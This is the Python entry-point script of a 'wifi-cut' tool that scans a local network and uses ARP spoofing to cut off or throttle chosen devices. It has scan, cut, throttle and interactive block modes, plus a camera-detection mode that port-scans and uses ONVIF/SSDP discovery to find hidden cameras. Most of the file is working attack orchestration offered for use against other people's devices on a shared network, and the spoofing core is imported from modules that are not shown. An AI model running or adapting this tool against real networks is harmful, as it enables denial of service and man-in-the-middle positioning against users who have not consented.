import argparse
import signal
import sys
import time
import atexit

from wifi_cut import camera_scan
from wifi_cut.platform_check import check_root, check_platform, ensure_ip_forwarding_disabled, ensure_ip_forwarding_enabled, set_ip_forwarding
from wifi_cut.throttler import Throttler
from wifi_cut.gateway import get_gateway_info, get_mac_by_ip
from wifi_cut.scanner import get_local_ip_and_mask, calculate_cidr, scan_network, Device
from wifi_cut.spoofer import ARPSpoofer


def format_device_table(devices: list[Device], gateway_ip: str, local_ip: str) -> str:
    header = f"{'#':<4} {'IP':<18} {'MAC':<20} {'Hostname':<25} {'Note'}"
    sep = "-" * 75
    lines = [sep, header, sep]
    for i, d in enumerate(devices, 1):
        note = ""
        if d.ip == gateway_ip:
            note = "Gateway"
        elif d.ip == local_ip:
            note = "You"
        hostname = d.hostname or "--"
        lines.append(f"{i:<4} {d.ip:<18} {d.mac:<20} {hostname:<25} {note}")
    lines.append(sep)
    return "\n".join(lines)


def cmd_scan(args):
    check_root()
    check_platform()
    gateway = get_gateway_info()
    print(f"[*] Interface: {gateway.interface}")
    print(f"[*] Gateway: {gateway.ip} ({gateway.mac})")

    local_ip, mask = get_local_ip_and_mask(gateway.interface)
    cidr = calculate_cidr(local_ip, mask)
    print(f"[*] Scanning {cidr} ...\n")

    devices = scan_network(cidr, gateway.interface, timeout=args.timeout)
    for d in devices:
        if d.ip == gateway.ip:
            d.is_gateway = True

    print(format_device_table(devices, gateway.ip, local_ip))
    print(f"\nFound {len(devices)} device(s)")


def cmd_cut(args):
    check_root()
    check_platform()
    gateway = get_gateway_info()
    print(f"[*] Gateway: {gateway.ip} ({gateway.mac})")

    original_forwarding = ensure_ip_forwarding_disabled()
    print("[*] IP Forwarding disabled")

    spoofer = ARPSpoofer(gateway)

    for ip in args.targets:
        try:
            mac = get_mac_by_ip(ip, gateway.interface)
            device = Device(ip=ip, mac=mac)
            spoofer.add_target(device)
            print(f"[*] Target: {ip} ({mac})")
        except RuntimeError as e:
            print(f"[!] Skip {ip}: {e}")

    if not spoofer.targets:
        print("[!] No valid targets, exiting.")
        if original_forwarding:
            set_ip_forwarding(True)
        return

    cleaned = False

    def cleanup(*_args):
        nonlocal cleaned
        if cleaned:
            return
        cleaned = True
        print("\n[*] Restoring ARP tables...")
        spoofer.stop()
        if original_forwarding:
            set_ip_forwarding(True)
        print("[+] Restored. Safe exit.")

    signal.signal(signal.SIGINT, lambda *a: (cleanup(), sys.exit(0)))
    signal.signal(signal.SIGTERM, lambda *a: (cleanup(), sys.exit(0)))
    atexit.register(cleanup)

    spoofer.start(interval=args.interval)
    print(f"[!] ARP Spoofing started for {len(spoofer.targets)} device(s). Press Ctrl+C to stop.\n")

    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            print(
                f"\r    Packets sent: {spoofer.packet_count} | "
                f"Elapsed: {mins:02d}:{secs:02d} | "
                f"Targets: {len(spoofer.targets)}",
                end="", flush=True
            )
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()


def cmd_camscan(args):
    """攝影機偵測：連接埠掃描 + 指紋 + ONVIF/SSDP 主動發現。

    給定目標 IP 時不需 root；未給定時會先做 ARP 掃描取得裝置清單（需 root）。
    """
    if args.targets:
        from wifi_cut.scanner import resolve_hostname
        # 直接指定 IP：無 MAC/廠商資訊，至少解析 hostname 讓 hostname 特徵生效
        targets: list = [
            Device(ip=ip, mac="", hostname=resolve_hostname(ip)) for ip in args.targets
        ]
        local_ip = camera_scan.default_local_ip()
        print("[!] 註: 指定 IP 模式無 MAC/廠商資訊，廠商可疑度有限；"
              "完整判斷請用無參數模式 (ARP 掃描，需 root)。")
    else:
        check_root()
        check_platform()
        gateway = get_gateway_info()
        local_ip, mask = get_local_ip_and_mask(gateway.interface)
        cidr = calculate_cidr(local_ip, mask)
        print(f"[*] Scanning {cidr} ...")
        scanned = scan_network(cidr, gateway.interface, timeout=args.timeout)
        targets = [d for d in scanned if d.ip != gateway.ip and d.ip != local_ip]

    print(f"[*] Camera-scanning {len(targets)} target(s)...\n")
    results = camera_scan.scan_devices(targets)

    order = {"LIKELY_CAMERA": 0, "OPEN_UNCLEAR": 1, "INDETERMINATE_CLOUD": 2, "IDENTIFIED_BENIGN": 3}
    for r in sorted(results, key=lambda x: order.get(x.verdict, 9)):
        ports = ", ".join(f"{p.port}/{p.kind}" for p in r.open_ports) or "—"
        name = r.identity or r.hostname or r.vendor or "--"
        print(f"[{r.verdict:<20}] {r.ip:<16} 可疑度={r.vendor_level:<6} {name}")
        print(f"    開放埠: {ports}")
        print(f"    判定: {r.summary}\n")

    print("[*] ONVIF / SSDP 主動發現 (找出無開放埠的攝影機)...")
    onvif = camera_scan.discover_onvif(local_ip=local_ip)
    if onvif:
        for cam in onvif:
            print(f"    [ONVIF 攝影機] {cam.ip}  XAddrs={cam.xaddrs}")
    else:
        print("    ONVIF: 未發現 IP 攝影機")
    for d in camera_scan.discover_ssdp(local_ip=local_ip):
        if d.camera_like:
            print(f"    [SSDP 疑似攝影機] {d.ip}  {d.descriptions[:2]}")


def cmd_interactive(args):
    check_root()
    check_platform()
    gateway = get_gateway_info()
    local_ip, mask = get_local_ip_and_mask(gateway.interface)
    cidr = calculate_cidr(local_ip, mask)

    print(f"[*] Gateway: {gateway.ip} ({gateway.mac})")
    print(f"[*] Scanning {cidr} ...\n")

    devices = scan_network(cidr, gateway.interface, timeout=args.timeout)
    print(format_device_table(devices, gateway.ip, local_ip))

    selectable = [d for d in devices if d.ip != gateway.ip and d.ip != local_ip]
    if not selectable:
        print("[!] No devices to block.")
        return

    print("\nEnter device numbers to block (comma-separated), e.g. 1,3,5:")
    selection = input("> ").strip()

    target_indices = []
    for s in selection.split(","):
        s = s.strip()
        if s.isdigit():
            idx = int(s) - 1
            if 0 <= idx < len(devices):
                d = devices[idx]
                if d.ip != gateway.ip and d.ip != local_ip:
                    target_indices.append(idx)

    if not target_indices:
        print("[!] No valid selection.")
        return

    original_forwarding = ensure_ip_forwarding_disabled()
    spoofer = ARPSpoofer(gateway)

    for idx in target_indices:
        d = devices[idx]
        spoofer.add_target(d)
        print(f"[*] Target: {d.ip} ({d.mac})")

    cleaned = False

    def cleanup(*_args):
        nonlocal cleaned
        if cleaned:
            return
        cleaned = True
        print("\n[*] Restoring ARP tables...")
        spoofer.stop()
        if original_forwarding:
            set_ip_forwarding(True)
        print("[+] Restored. Safe exit.")

    signal.signal(signal.SIGINT, lambda *a: (cleanup(), sys.exit(0)))
    signal.signal(signal.SIGTERM, lambda *a: (cleanup(), sys.exit(0)))
    atexit.register(cleanup)

    spoofer.start()
    print(f"\n[!] Blocking {len(spoofer.targets)} device(s). Press Ctrl+C to stop.\n")

    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            print(
                f"\r    Packets: {spoofer.packet_count} | "
                f"Time: {mins:02d}:{secs:02d} | "
                f"Targets: {len(spoofer.targets)}",
                end="", flush=True
            )
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()


def cmd_throttle(args):
    check_root()
    check_platform()
    gateway = get_gateway_info()
    print(f"[*] Gateway: {gateway.ip} ({gateway.mac})")

    original_forwarding = ensure_ip_forwarding_enabled()
    print("[*] IP Forwarding enabled (throttle mode)")

    spoofer = ARPSpoofer(gateway)
    target_ips = []

    for ip in args.targets:
        try:
            mac = get_mac_by_ip(ip, gateway.interface)
            device = Device(ip=ip, mac=mac)
            spoofer.add_target(device)
            target_ips.append(ip)
            print(f"[*] Target: {ip} ({mac})")
        except RuntimeError as e:
            print(f"[!] Skip {ip}: {e}")

    if not spoofer.targets:
        print("[!] No valid targets, exiting.")
        if not original_forwarding:
            set_ip_forwarding(False)
        return

    throttler = Throttler(targets=target_ips, bandwidth=args.bw)

    cleaned = False

    def cleanup(*_args):
        nonlocal cleaned
        if cleaned:
            return
        cleaned = True
        print("\n[*] Stopping throttle...")
        throttler.stop()
        print("[*] Restoring ARP tables...")
        spoofer.stop()
        if not original_forwarding:
            set_ip_forwarding(False)
        print("[+] Restored. Safe exit.")

    signal.signal(signal.SIGINT, lambda *a: (cleanup(), sys.exit(0)))
    signal.signal(signal.SIGTERM, lambda *a: (cleanup(), sys.exit(0)))
    atexit.register(cleanup)

    spoofer.start(interval=args.interval)
    throttler.start()

    print(f"[!] Throttling {len(spoofer.targets)} device(s) at {args.bw}. Press Ctrl+C to stop.\n")

    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            print(
                f"\r    Packets: {spoofer.packet_count} | "
                f"Time: {mins:02d}:{secs:02d} | "
                f"Targets: {len(spoofer.targets)} | "
                f"BW: {args.bw}",
                end="", flush=True
            )
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()


def main():
    parser = argparse.ArgumentParser(
        prog="wifi-cut",
        description="ARP Spoofing WiFi device blocker"
    )
    parser.add_argument("-t", "--timeout", type=int, default=3, help="Scan timeout (seconds)")
    parser.add_argument("--interval", type=float, default=1.5, help="ARP packet interval (seconds)")

    sub = parser.add_subparsers(dest="command")

    sub.add_parser("scan", help="Scan and list all devices on the network")

    camscan_parser = sub.add_parser(
        "camscan", help="Detect hidden/pinhole cameras (port scan + ONVIF/SSDP)"
    )
    camscan_parser.add_argument(
        "targets", nargs="*",
        help="Target IPs (no root needed); if omitted, ARP-scans the network first",
    )

    cut_parser = sub.add_parser("cut", help="Block specific devices by IP")
    cut_parser.add_argument("targets", nargs="+", help="Target IP addresses")

    throttle_parser = sub.add_parser("throttle", help="Throttle specific devices (limit bandwidth)")
    throttle_parser.add_argument("targets", nargs="+", help="Target IP addresses")
    throttle_parser.add_argument("--bw", default="10Kbit/s", help="Bandwidth limit (default: 10Kbit/s)")

    sub.add_parser("interactive", help="Interactive mode: scan, select, block")

    args = parser.parse_args()

    if not args.command:
        args.command = "interactive"

    if args.command == "scan":
        cmd_scan(args)
    elif args.command == "camscan":
        cmd_camscan(args)
    elif args.command == "cut":
        cmd_cut(args)
    elif args.command == "throttle":
        cmd_throttle(args)
    elif args.command == "interactive":
        try:
            from wifi_cut.tui import run_tui
            run_tui(timeout=args.timeout, interval=args.interval)
        except ImportError:
            cmd_interactive(args)


if __name__ == "__main__":
    main()
